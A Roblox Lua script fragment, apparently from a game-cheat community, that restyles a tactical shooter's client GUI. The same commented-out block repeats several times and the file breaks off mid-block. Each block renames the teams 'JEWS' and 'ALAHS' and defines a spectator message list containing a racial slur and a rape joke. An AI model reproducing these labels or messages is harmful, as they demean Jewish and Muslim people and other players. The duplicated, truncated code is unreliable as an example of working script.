	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

